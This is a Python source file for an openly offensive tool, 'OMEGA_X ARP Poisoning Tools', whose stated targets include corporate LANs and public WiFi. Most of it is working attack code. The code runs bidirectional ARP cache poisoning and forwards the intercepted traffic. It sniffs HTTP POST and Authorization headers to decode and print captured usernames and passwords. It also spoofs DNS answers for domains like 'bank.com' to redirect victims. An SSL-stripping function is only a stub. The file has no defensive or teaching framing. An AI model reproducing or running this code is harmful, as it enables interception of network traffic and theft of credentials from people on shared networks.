#!/usr/bin/env python3
"""
OMEGA_X ARP Poisoning Tools
============================

Advanced ARP poisoning and network manipulation framework.

This module provides comprehensive ARP spoofing capabilities:
- Man-in-the-middle attacks
- Network traffic interception
- Session hijacking
- DNS spoofing
- SSL stripping
- Credential harvesting

TARGETS:
- Local network segments
- Wireless networks
- Corporate LANs
- Public WiFi networks
- IoT devices

ATTACK VECTORS:
- ARP cache poisoning
- Gratuitous ARP
- ARP flooding
- Bidirectional poisoning
- Selective poisoning

AUTHOR: OMEGA_X Development Team
VERSION: 1.0
"""

import os
import sys
import time
import socket
import struct
import threading
import signal
from datetime import datetime
import argparse
import subprocess
import fcntl
import array

try:
    from scapy.all import *
    import netifaces
    import psutil
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Install required packages: pip install scapy netifaces psutil")
    sys.exit(1)

class ARPPoisoner:
    """Advanced ARP poisoning and MITM attack system"""

    def __init__(self, interface=None, gateway_ip=None, target_ip=None):
        self.interface = interface or self.get_default_interface()
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.gateway_mac = None
        self.target_mac = None
        self.my_mac = self.get_my_mac()
        self.my_ip = self.get_my_ip()
        self.poisoning_active = False
        self.attack_log = []
        self.captured_packets = []
        self.credentials = []

        # Packet forwarding
        self.ip_forward = False

        # Attack statistics
        self.stats = {
            'arp_requests_sent': 0,
            'arp_replies_sent': 0,
            'packets_forwarded': 0,
            'credentials_captured': 0,
            'start_time': None,
            'end_time': None
        }

    def get_default_interface(self):
        """Get default network interface"""
        try:
            # Get default gateway interface
            gateways = netifaces.gateways()
            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                return gateways['default'][netifaces.AF_INET][1]
        except:
            pass

        # Fallback: get first non-loopback interface
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if iface != 'lo':
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    return iface

        return 'eth0'  # Ultimate fallback

    def get_my_ip(self):
        """Get our IP address"""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
        return None

    def get_my_mac(self):
        """Get our MAC address"""
        try:
            with open(f'/sys/class/net/{self.interface}/address', 'r') as f:
                return f.read().strip()
        except:
            # Alternative method
            try:
                result = subprocess.run(['cat', f'/sys/class/net/{self.interface}/address'],
                                      capture_output=True, text=True)
                return result.stdout.strip()
            except:
                return None

    def get_mac(self, ip):
        """Get MAC address for IP using ARP"""
        self.log(f"Resolving MAC for {ip}...")

        # Send ARP request
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        try:
            answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=0)
            if answered:
                return answered[0][1].hwsrc
        except:
            pass

        self.log(f"Could not resolve MAC for {ip}", "warning")
        return None

    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        self.log("Enabling IP forwarding...")

        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            self.ip_forward = True
            self.log("IP forwarding enabled")
        except Exception as e:
            self.log(f"Failed to enable IP forwarding: {e}", "error")

    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            self.ip_forward = False
            self.log("IP forwarding disabled")
        except:
            pass

    def log(self, message, level="info"):
        """Log poisoning activity"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level.upper()}] {message}"
        self.attack_log.append(log_entry)
        print(log_entry)

    def resolve_targets(self):
        """Resolve MAC addresses for targets"""
        self.log("Resolving target MAC addresses...")

        if self.gateway_ip:
            self.gateway_mac = self.get_mac(self.gateway_ip)
            if not self.gateway_mac:
                return False

        if self.target_ip:
            self.target_mac = self.get_mac(self.target_ip)
            if not self.target_mac:
                return False

        self.log("Target resolution completed")
        return True

    def send_arp_poison(self, target_ip, target_mac, spoof_ip, spoof_mac=None):
        """Send ARP poison packet"""
        if not spoof_mac:
            spoof_mac = self.my_mac

        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                          psrc=spoof_ip, hwsrc=spoof_mac)

        try:
            send(arp_response, verbose=0)
            self.stats['arp_replies_sent'] += 1
            return True
        except Exception as e:
            self.log(f"ARP poison failed: {e}", "error")
            return False

    def bidirectional_poison(self):
        """Perform bidirectional ARP poisoning"""
        self.log("Starting bidirectional ARP poisoning...")

        while self.poisoning_active:
            # Poison target: tell target that we are the gateway
            if self.target_ip and self.target_mac:
                self.send_arp_poison(self.target_ip, self.target_mac, self.gateway_ip)

            # Poison gateway: tell gateway that we are the target
            if self.gateway_ip and self.gateway_mac:
                self.send_arp_poison(self.gateway_ip, self.gateway_mac, self.target_ip)

            time.sleep(2)  # Send every 2 seconds

    def start_poisoning(self):
        """Start ARP poisoning attack"""
        if not self.resolve_targets():
            self.log("Failed to resolve targets", "error")
            return False

        self.enable_ip_forwarding()
        self.poisoning_active = True
        self.stats['start_time'] = datetime.now()

        self.log("🚀 Starting ARP poisoning attack")
        self.log(f"Interface: {self.interface}")
        self.log(f"My IP/MAC: {self.my_ip} / {self.my_mac}")
        if self.gateway_ip:
            self.log(f"Gateway: {self.gateway_ip} / {self.gateway_mac}")
        if self.target_ip:
            self.log(f"Target: {self.target_ip} / {self.target_mac}")

        # Start poisoning thread
        poison_thread = threading.Thread(target=self.bidirectional_poison)
        poison_thread.daemon = True
        poison_thread.start()

        # Start packet forwarding
        forward_thread = threading.Thread(target=self.packet_forwarder)
        forward_thread.daemon = True
        forward_thread.start()

        # Start traffic analyzer
        analyzer_thread = threading.Thread(target=self.traffic_analyzer)
        analyzer_thread.daemon = True
        analyzer_thread.start()

        return True

    def stop_poisoning(self):
        """Stop ARP poisoning and restore ARP tables"""
        self.log("Stopping ARP poisoning...")

        self.poisoning_active = False
        self.stats['end_time'] = datetime.now()

        # Send restorative ARP packets
        self.restore_arp_tables()

        # Disable IP forwarding
        self.disable_ip_forwarding()

        self.log("ARP poisoning stopped")

    def restore_arp_tables(self):
        """Restore original ARP table entries"""
        self.log("Restoring ARP tables...")

        # Send correct ARP responses to restore original mappings
        if self.target_ip and self.target_mac and self.gateway_mac:
            self.send_arp_poison(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)

        if self.gateway_ip and self.gateway_mac and self.target_mac:
            self.send_arp_poison(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)

        time.sleep(1)  # Allow time for restoration

    def packet_forwarder(self):
        """Forward intercepted packets"""
        self.log("Starting packet forwarding...")

        def forward_packet(packet):
            """Forward a single packet"""
            if IP in packet:
                # Modify packet and forward
                if packet[IP].dst == self.my_ip:
                    # Packet destined for us (MITM)
                    if packet[IP].src == self.target_ip:
                        # From target to us, forward to gateway
                        packet[IP].dst = self.gateway_ip
                        packet[Ether].dst = self.gateway_mac
                    elif packet[IP].src == self.gateway_ip:
                        # From gateway to us, forward to target
                        packet[IP].dst = self.target_ip
                        packet[Ether].dst = self.target_mac

                    # Forward the packet
                    sendp(packet, verbose=0)
                    self.stats['packets_forwarded'] += 1

        # Sniff and forward packets
        filter_str = f"ip and (src {self.target_ip} or dst {self.target_ip})"
        try:
            sniff(iface=self.interface, prn=forward_packet, filter=filter_str,
                  store=0, stop_filter=lambda x: not self.poisoning_active)
        except Exception as e:
            self.log(f"Packet forwarding error: {e}", "error")

    def traffic_analyzer(self):
        """Analyze intercepted traffic for credentials"""
        self.log("Starting traffic analysis...")

        def analyze_packet(packet):
            """Analyze a packet for sensitive information"""
            if IP in packet and TCP in packet:
                payload = bytes(packet[TCP].payload)

                # Look for HTTP POST data
                if b'POST' in payload or b'Authorization:' in payload:
                    self.captured_packets.append({
                        'timestamp': datetime.now(),
                        'src': packet[IP].src,
                        'dst': packet[IP].dst,
                        'payload': payload.decode('utf-8', errors='ignore')
                    })

                    # Extract credentials
                    self.extract_credentials(payload)

        # Sniff traffic
        filter_str = f"tcp and (src {self.target_ip} or dst {self.target_ip}) and (port 80 or port 443)"
        try:
            sniff(iface=self.interface, prn=analyze_packet, filter=filter_str,
                  store=0, stop_filter=lambda x: not self.poisoning_active)
        except Exception as e:
            self.log(f"Traffic analysis error: {e}", "error")

    def extract_credentials(self, payload):
        """Extract credentials from packet payload"""
        payload_str = payload.decode('utf-8', errors='ignore')

        # Look for common credential patterns
        import re

        # HTTP Basic Auth
        auth_match = re.search(r'Authorization: Basic ([^\r\n]+)', payload_str)
        if auth_match:
            try:
                import base64
                decoded = base64.b64decode(auth_match.group(1)).decode('utf-8')
                username, password = decoded.split(':', 1)
                self.credentials.append({
                    'type': 'http_basic',
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now()
                })
                self.stats['credentials_captured'] += 1
                self.log(f"HTTP Basic Auth captured: {username}:{password}")
            except:
                pass

        # FTP credentials
        if b'USER ' in payload or b'PASS ' in payload:
            # FTP traffic
            pass

    def dns_spoofing(self, spoofed_domains=None):
        """Perform DNS spoofing"""
        if not spoofed_domains:
            spoofed_domains = ['bank.com', 'login.com', 'secure.com']

        self.log("Starting DNS spoofing...")

        def dns_spoof(packet):
            """Spoof DNS responses"""
            if DNS in packet and packet[DNS].qr == 0:  # DNS query
                queried_domain = packet[DNS].qd.qname.decode('utf-8').rstrip('.')

                if any(domain in queried_domain for domain in spoofed_domains):
                    # Send spoofed DNS response
                    spoofed_ip = self.my_ip  # Redirect to us

                    dns_response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                                 UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                                 DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                    an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spoofed_ip))

                    send(dns_response, verbose=0)
                    self.log(f"DNS spoofed: {queried_domain} -> {spoofed_ip}")

        # Sniff DNS queries
        filter_str = "udp port 53"
        try:
            sniff(iface=self.interface, prn=dns_spoof, filter=filter_str,
                  store=0, stop_filter=lambda x: not self.poisoning_active)
        except Exception as e:
            self.log(f"DNS spoofing error: {e}", "error")

    def ssl_strip(self):
        """Perform SSL stripping attack"""
        self.log("Starting SSL stripping...")

        # This would implement sslstrip-like functionality
        # Redirect HTTPS to HTTP, capture credentials
        self.log("SSL stripping not fully implemented yet", "warning")

    def network_scan(self):
        """Scan network for potential targets"""
        self.log("Scanning local network...")

        # Get network range
        my_ip_parts = self.my_ip.split('.')
        network = f"{my_ip_parts[0]}.{my_ip_parts[1]}.{my_ip_parts[2]}.0/24"

        # ARP scan
        ans, unans = arping(network, verbose=0)

        hosts = []
        for sent, received in ans:
            hosts.append({
                'ip': received.psrc,
                'mac': received.hwsrc
            })

        self.log(f"Found {len(hosts)} hosts on network")
        return hosts

    def run_mitm_attack(self):
        """Run complete MITM attack"""
        if not self.start_poisoning():
            return False

        self.log("🎯 MITM Attack Active - Intercepting Traffic")
        self.log("Press Ctrl+C to stop...")

        try:
            # Keep running until interrupted
            while self.poisoning_active:
                time.sleep(1)

                # Print stats every 30 seconds
                if int(time.time()) % 30 == 0:
                    self.print_stats()

        except KeyboardInterrupt:
            self.log("Attack interrupted by user")
        finally:
            self.stop_poisoning()
            self.print_final_report()

        return True

    def print_stats(self):
        """Print current attack statistics"""
        runtime = datetime.now() - self.stats['start_time']
        print(f"\n--- Attack Statistics (Runtime: {runtime}) ---")
        print(f"ARP Replies Sent: {self.stats['arp_replies_sent']}")
        print(f"Packets Forwarded: {self.stats['packets_forwarded']}")
        print(f"Credentials Captured: {self.stats['credentials_captured']}")
        print(f"Captured Packets: {len(self.captured_packets)}")

    def print_final_report(self):
        """Print final attack report"""
        print(f"\n{'='*50}")
        print("🎯 OMEGA_X ARP POISONING ATTACK REPORT")
        print(f"{'='*50}")

        runtime = self.stats['end_time'] - self.stats['start_time']
        print(f"Attack Duration: {runtime}")
        print(f"ARP Replies Sent: {self.stats['arp_replies_sent']}")
        print(f"Packets Forwarded: {self.stats['packets_forwarded']}")
        print(f"Credentials Captured: {self.stats['credentials_captured']}")

        if self.credentials:
            print(f"\n📋 Captured Credentials:")
            for cred in self.credentials:
                print(f"  {cred['type']}: {cred['username']}:{cred['password']}")

        print(f"\n✅ Attack completed successfully")

def main():
    parser = argparse.ArgumentParser(description="OMEGA_X ARP Poisoning Tool")
    parser.add_argument("--interface", help="Network interface to use")
    parser.add_argument("--gateway", required=True, help="Gateway IP address")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--scan", action="store_true", help="Scan network for targets")
    parser.add_argument("--dns-spoof", nargs='*', help="Domains to DNS spoof")

    args = parser.parse_args()

    poisoner = ARPPoisoner(
        interface=args.interface,
        gateway_ip=args.gateway,
        target_ip=args.target
    )

    if args.scan:
        hosts = poisoner.network_scan()
        print("\nDiscovered hosts:")
        for host in hosts:
            print(f"  {host['ip']} - {host['mac']}")
        return

    # Setup signal handler for clean exit
    def signal_handler(sig, frame):
        print("\n🛑 Stopping attack...")
        poisoner.stop_poisoning()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # Run the attack
    success = poisoner.run_mitm_attack()

    if success:
        print("\n🎉 ARP poisoning attack completed!")
    else:
        print("\n❌ ARP poisoning attack failed!")
        sys.exit(1)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("❌ This tool requires root privileges")
        print("Run with: sudo python3 arp_poisoning_implementation.py")
        sys.exit(1)

    try:
        main()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)
